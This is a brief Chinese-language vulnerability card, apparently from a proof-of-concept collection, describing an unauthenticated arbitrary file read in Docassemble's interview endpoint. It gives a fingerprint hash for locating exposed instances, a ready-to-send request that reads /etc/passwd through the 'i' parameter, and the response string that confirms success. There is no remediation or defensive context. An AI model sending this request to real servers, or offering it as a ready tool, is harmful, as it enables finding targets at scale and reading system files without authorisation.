# Docassembleinterview未授权任意文件读取漏洞

Docassembleinterview ｜ 任意文件读取/写入 ｜ —
- **指纹**：`icon_hash="-575790689"`
- **请求**：`GET /interview?i=/etc/passwd HTTP/1.1`
- **响应特征**：200 root: